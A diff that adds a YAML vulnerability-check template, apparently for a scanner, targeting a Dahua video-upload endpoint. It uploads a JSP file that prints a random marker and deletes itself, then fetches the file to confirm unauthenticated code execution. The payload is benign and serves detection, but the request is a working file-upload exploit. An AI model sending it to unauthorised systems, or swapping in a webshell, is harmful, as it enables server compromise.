@@ -1,0 +1,32 @@
+name: poc-yaml-dahua-video-upload
+manual: true
+transport: http
+set:
+    rStr1: md5(randomLowercase(8))
+    rStr2: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /publishing/publishing/material/file/video
+            headers:
+                Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
+            body: "--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{{rStr2}}.jsp\"\r\n\r\n<% out.println(\"{{rStr1}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--\r\n"
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("\"success\":true") && response.body_string.contains(".jsp")
+        output:
+            search: '"\"path\":\"(?P<path>.+?).jsp\"}".bsubmatch(response.body)'
+            path: search["path"]
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /publishingImg/{{path}}.jsp
+            follow_redirects: false
+        expression: response.status == 200 && rStr1.matches(response.body_string)
+expression: r0() && r1()
+detail:
+    author: secking
+    links:
+        - https://www.dahuatech.com/
